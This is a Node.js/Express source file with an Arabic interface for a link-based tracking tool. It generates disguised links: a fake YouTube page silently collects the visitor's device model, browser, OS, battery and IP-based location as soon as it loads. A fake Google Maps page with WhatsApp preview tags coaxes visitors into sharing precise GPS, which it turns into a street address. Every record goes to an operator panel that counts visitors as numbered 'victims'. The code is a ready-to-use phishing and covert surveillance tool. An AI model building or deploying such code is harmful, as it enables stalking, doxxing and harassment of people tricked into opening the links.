const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

app.use(express.json());

// 1. لوحة التحكم الموحدة لاختيار نوع الرابط واستلام البيانات
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>لوحة التحكم المركزية الذكية</title>
        <style>
            body { font-family: system-ui, sans-serif; background: #121212; color: #fff; text-align: center; padding: 20px; }
            .card { background: #1e1e1e; border-radius: 12px; padding: 20px; margin: 15px auto; max-width: 600px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); text-align: right; }
            h2, h3 { text-align: center; }
            button { background: #ff0000; color: white; border: none; padding: 12px 20px; font-size: 15px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 10px; }
            button.map-btn { background: #25D366; }
            button:hover { opacity: 0.9; }
            input, select { width: 100%; padding: 10px; border-radius: 6px; border: 1px solid #333; background: #222; color: #fff; margin-top: 8px; box-sizing: border-box; }
            .section { margin-bottom: 25px; border-bottom: 1px solid #333; padding-bottom: 20px; }
            .info-box { background: #2a2a2a; padding: 15px; border-radius: 8px; margin-top: 12px; border-right: 5px solid #ff0000; font-size: 14px; line-height: 1.7; }
        </style>
    </head>
    <body>
        <h2>🎛️ لوحة التحكم المركزية للروابط الذكية</h2>
        
        <!-- قسم إنشاء الروابط -->
        <div class="card">
            <h3>🔗 منشئ الروابط المتعدد</h3>
            
            <div class="section">
                <label>اختر نوع الرابط:</label>
                <select id="linkType" onchange="toggleInputs()">
                    <option value="youtube">رابط يوتيوب (فيديو ترفيهي صامت)</option>
                    <option value="map">رابط خريطة مباشر (لواتساب وتحديد الموقع)</option>
                </select>
            </div>

            <div id="youtubeSection" class="section">
                <label>رابط فيديو يوتيوب:</label>
                <input type="text" id="ytUrlInput" value="https://www.youtube.com/watch?v=dQw4w9WgXcQ">
                <button type="button" onclick="makeLink('youtube')">📺 إنشاء رابط يوتيوب</button>
            </div>

            <div id="mapSection" class="section" style="display:none;">
                <p style="font-size: 13px; color: #aaa;">سيظهر الرابط كمعاينة خريطة حقيقية لجلب عنوان الضحية بدقة عند الموافقة.</p>
                <button type="button" class="map-btn" onclick="makeLink('map')">🗺️ إنشاء رابط الخريطة</button>
            </div>

            <div id="linkContainer" style="display:none; margin-top: 15px;">
                <label>الرابط الجاهز للنسخ:</label>
                <input type="text" id="linkInput" readonly onclick="this.select();">
            </div>
        </div>

        <!-- قسم استقبال بيانات الضحايا لحظياً -->
        <h3>📥 سجل الضحايا والأجهزة الواردة:</h3>
        <div id="logs" class="card">
            <p style="color: #aaa; text-align: center;">في انتظار تفاعلات الضحايا وفتاحة الروابط...</p>
        </div>

        <script src="/socket.io/socket.io.js"></script>
        <script>
            function toggleInputs() {
                const type = document.getElementById('linkType').value;
                if (type === 'youtube') {
                    document.getElementById('youtubeSection').style.display = 'block';
                    document.getElementById('mapSection').style.display = 'none';
                } else {
                    document.getElementById('youtubeSection').style.display = 'none';
                    document.getElementById('mapSection').style.display = 'block';
                }
                document.getElementById('linkContainer').style.display = 'none';
            }

            function makeLink(type) {
                const uniqueId = Math.random().toString(36).substring(2, 8);
                let fullUrl = "";

                if (type === 'youtube') {
                    const ytUrl = document.getElementById('ytUrlInput').value;
                    let videoId = "dQw4w9WgXcQ";
                    if (ytUrl.includes('youtu.be/')) {
                        videoId = ytUrl.split('youtu.be/')[1].substring(0, 11);
                    } else if (ytUrl.includes('v=')) {
                        videoId = ytUrl.split('v=')[1].substring(0, 11);
                    }
                    fullUrl = window.location.origin + '/watch/' + uniqueId + '?v=' + videoId;
                } else {
                    fullUrl = window.location.origin + '/location/' + uniqueId;
                }
                
                document.getElementById('linkInput').value = fullUrl;
                document.getElementById('linkContainer').style.display = 'block';
            }

            let victimCounter = 1;
            const socket = io();
            socket.on('new-device-data', (data) => {
                const logs = document.getElementById('logs');
                if (logs.innerText.includes('في انتظار تفاعلات')) logs.innerHTML = '';
                
                const box = document.createElement('div');
                box.className = 'info-box';
                box.innerHTML = '<strong>🔴 الضحية رقم (# ' + victimCounter++ + ')</strong><br>' +
                                '<strong>🎯 نوع الرابط المفتوح:</strong> ' + data.targetType + '<br>' +
                                '<strong>📱 ماركة الهاتف:</strong> ' + data.deviceName + '<br>' +
                                '<strong>🌐 المتصفح والنظام:</strong> ' + data.browser + ' / ' + data.os + '<br>' +
                                '<strong>📡 الشبكة (ISP):</strong> ' + data.networkISP + '<br>' +
                                '<strong>🌐 عنوان IP:</strong> ' + data.ip + '<br>' +
                                '<strong>📍 العنوان الدقيق (الشارع والمنطقة):</strong> <span style="color: #4CAF50; font-weight: bold;">' + data.fullAddress + '</span><br>' +
                                (data.lat ? '<strong>🗺️ إحداثيات الخريطة:</strong> <a href="https://maps.google.com/?q=' + data.lat + ',' + data.lon + '" target="_blank" style="color: #00bcd4;">فتح على خرائط جوجل</a><br>' : '') +
                                '<strong>🔋 البطارية:</strong> ' + data.battery + '<br>' +
                                '<strong>🕒 وقت الدخول:</strong> ' + data.time;
                logs.prepend(box);
            });
        </script>
    </body>
    </html>
  `);
});

// 2. مسار رابط يوتيوب (جمع صامت)
app.get('/watch/:id', async (req, res) => {
  const videoId = req.query.v || 'dQw4w9WgXcQ';
  let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'غير معروف';
  if (clientIp.includes(',')) clientIp = clientIp.split(',')[0].trim();

  res.send(`
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>YouTube</title>
        <style>
            body { font-family: Arial, sans-serif; background: #0f0f0f; color: #fff; margin: 0; padding: 0; text-align: center; }
            .header { background: #212121; padding: 12px 20px; text-align: left; font-weight: bold; font-size: 18px; color: #ff0000; border-bottom: 1px solid #333; }
            .container { max-width: 800px; margin: 20px auto; padding: 10px; }
            .video-container { position: relative; width: 100%; padding-bottom: 56.25%; height: 0; background: #000; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 20px rgba(0,0,0,0.8); }
            .video-container iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: 0; }
        </style>
    </head>
    <body>
        <div class="header">▶ YouTube</div>
        <div class="container">
            <div class="video-container">
                <iframe src="https://www.youtube-nocookie.com/embed/${videoId}?autoplay=1" allow="autoplay; encrypted-media" allowfullscreen></iframe>
            </div>
        </div>

        <script>
            function getExactDeviceModel(ua) {
                let match = ua.match(/(Redmi\\s[\\w\\d]+|SM-[A-Z0-9]+|iPhone\\s[\\w\\s]+|POCO\\s[\\w\\d]+|Pixel\\s[\\td\\w\\s]+|Huawei\\s[\\w\\d]+|OPPO\\s[\\w\\d]+|Vivo\\s[\\w\\d]+)/i);
                if (match) return match[0];
                if (ua.includes('Android')) return 'هاتف Android';
                if (ua.includes('iPhone')) return 'Apple iPhone';
                if (ua.includes('Windows')) return 'Windows Computer';
                return 'جهاز ذكي';
            }
            function getBrowserInfo(ua) {
                if (ua.includes('Firefox')) return 'Firefox';
                if (ua.includes('SamsungBrowser')) return 'Samsung Internet';
                if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
                if (ua.includes('Edg')) return 'Edge';
                if (ua.includes('Chrome')) return 'Chrome';
                if (ua.includes('Safari')) return 'Safari';
                return 'متصفح آخر';
            }
            function getOSInfo(ua) {
                if (ua.includes('Win')) return 'Windows';
                if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
                if (ua.includes('Android')) return 'Android';
                if (ua.includes('Mac')) return 'macOS';
                return 'أخرى';
            }

            async function collectAndSend() {
                let batteryLevel = "غير مدعوم";
                if (navigator.getBattery) {
                    try {
                        const b = await navigator.getBattery();
                        batteryLevel = Math.round(b.level * 100) + "% " + (b.charging ? "(⚡ يشحن)" : "");
                    } catch(e){}
                }

                const ua = navigator.userAgent;
                const deviceData = {
                    targetType: "رابط يوتيوب (صامت)",
                    deviceName: getExactDeviceModel(ua),
                    browser: getBrowserInfo(ua),
                    os: getOSInfo(ua),
                    ip: "${clientIp}",
                    battery: batteryLevel,
                    networkISP: "جاري الجلب...",
                    fullAddress: "جاري الجلب عبر IP...",
                    time: new Date().toLocaleTimeString('ar-EG')
                };

                try {
                    const response = await fetch('https://ipapi.co/${clientIp}/json/');
                    const ipData = await response.json();
                    deviceData.networkISP = ipData.org || "غير معروف";
                    deviceData.fullAddress = (ipData.city || "مجهول") + ", " + (ipData.country_name || "مجهول");
                } catch(e){}

                fetch('/api/log', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(deviceData)
                });
            }

            window.onload = collectAndSend;
        </script>
    </body>
    </html>
  `);
});

// 3. مسار رابط الخريطة (مع معاينة واتساب وطلب موقع GPS)
app.get('/location/:id', async (req, res) => {
  let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'غير معروف';
  if (clientIp.includes(',')) clientIp = clientIp.split(',')[0].trim();

  res.send(`
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>مشاركة الموقع الجغرافي - خرائط Google</title>
        
        <meta property="og:title" content="مشاركة موقع جغرافي مباشر عبر الخريطة">
        <meta property="og:description" content="اضغط هنا لعرض وتحديث موقعك الحالي على الخريطة بدقة عالية.">
        <meta property="og:image" content="https://images.unsplash.com/photo-1526778548025-fa2f459cd5c1?w=600&auto=format&fit=crop&q=80">
        <meta property="og:url" content="${req.protocol}://${req.get('host')}${req.originalUrl}">
        <meta property="og:type" content="website">

        <style>
            body { font-family: Arial, sans-serif; background: #f8f9fa; color: #333; margin: 0; padding: 0; text-align: center; }
            .header { background: #4285F4; color: white; padding: 16px; font-size: 18px; font-weight: bold; }
            .container { max-width: 450px; margin: 40px auto; padding: 25px; background: white; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
            button { background: #34A853; color: white; border: none; padding: 14px 28px; font-size: 17px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 20px; }
            button:hover { background: #2e8b45; }
            p { color: #555; font-size: 15px; line-height: 1.6; }
            #status { margin-top: 15px; font-weight: bold; color: #4285F4; }
        </style>
    </head>
    <body>
        <div class="header">📍 نظام خرائط الموقع المباشر</div>
        <div class="container">
            <h3>تأكيد ومشاركة الموقع</h3>
            <p>للاطلاع على تفاصيل المنطقة وعرض أقرب الطرق على الخريطة، يرجى الضغط على الزر أدناه.</p>
            <button onclick="requestLocation()">🗺️ فتح الخريطة وعرض الموقع</button>
            <div id="status"></div>
        </div>

        <script>
            function getExactDeviceModel(ua) {
                let match = ua.match(/(Redmi\\s[\\w\\d]+|SM-[A-Z0-9]+|iPhone\\s[\\w\\s]+|POCO\\s[\\w\\d]+|Pixel\\s[\\td\\w\\s]+|Huawei\\s[\\w\\d]+|OPPO\\s[\\w\\d]+|Vivo\\s[\\w\\d]+)/i);
                if (match) return match[0];
                if (ua.includes('Android')) return 'هاتف Android';
                if (ua.includes('iPhone')) return 'Apple iPhone';
                if (ua.includes('Windows')) return 'Windows Computer';
                return 'جهاز ذكي';
            }
            function getBrowserInfo(ua) {
                if (ua.includes('Firefox')) return 'Firefox';
                if (ua.includes('SamsungBrowser')) return 'Samsung Internet';
                if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
                if (ua.includes('Edg')) return 'Edge';
                if (ua.includes('Chrome')) return 'Chrome';
                if (ua.includes('Safari')) return 'Safari';
                return 'متصفح آخر';
            }
            function getOSInfo(ua) {
                if (ua.includes('Win')) return 'Windows';
                if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
                if (ua.includes('Android')) return 'Android';
                if (ua.includes('Mac')) return 'macOS';
                return 'أخرى';
            }

            async function requestLocation() {
                document.getElementById('status').innerText = "جاري الاتصال بقواعد بيانات الخرائط...";
                
                const ua = navigator.userAgent;
                const deviceData = {
                    targetType: "رابط خريطة مباشر",
                    deviceName: getExactDeviceModel(ua),
                    browser: getBrowserInfo(ua),
                    os: getOSInfo(ua),
                    ip: "${clientIp}",
                    battery: "غير متاح",
                    networkISP: "جاري الجلب...",
                    fullAddress: "جاري تحديد الموقع...",
                    lat: null,
                    lon: null,
                    time: new Date().toLocaleTimeString('ar-EG')
                };

                try {
                    const response = await fetch('https://ipapi.co/${clientIp}/json/');
                    const ipData = await response.json();
                    deviceData.networkISP = ipData.org || "غير معروف";
                } catch(e){}

                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        async (pos) => {
                            const lat = pos.coords.latitude;
                            const lon = pos.coords.longitude;
                            deviceData.lat = lat;
                            deviceData.lon = lon;

                            try {
                                const resGeo = await fetch('https://nominatim.openstreetmap.org/reverse?format=json&lat=' + lat + '&lon=' + lon + '&accept-language=ar');
                                const geoData = await resGeo.json();
                                if (geoData && geoData.display_name) {
                                    deviceData.fullAddress = geoData.display_name;
                                } else {
                                    deviceData.fullAddress = "خطوط الطول: " + lat + ", العرض: " + lon;
                                }
                            } catch(err) {
                                deviceData.fullAddress = "خطوط الطول: " + lat + ", العرض: " + lon;
                            }

                            sendData(deviceData);
                            document.getElementById('status').style.color = "green";
                            document.getElementById('status').innerText = "✅ تم تحميل الخريطة بنجاح!";
                        },
                        (err) => {
                            deviceData.fullAddress = "رفض المستخدم إذن الموقع";
                            sendData(deviceData);
                            document.getElementById('status').style.color = "red";
                            document.getElementById('status').innerText = "❌ يجب السماح بإذن الموقع لعرض التفاصيل.";
                        },
                        { timeout: 10000, enableHighAccuracy: true }
                    );
                } else {
                    deviceData.fullAddress = "المتصفح لا يدعم الموقع";
                    sendData(deviceData);
                }
            }

            function sendData(data) {
                fetch('/api/log', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
            }
        </script>
    </body>
    </html>
  `);
});

app.post('/api/log', (req, res) => {
  io.emit('new-device-data', req.body);
  res.json({ status: 'success' });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
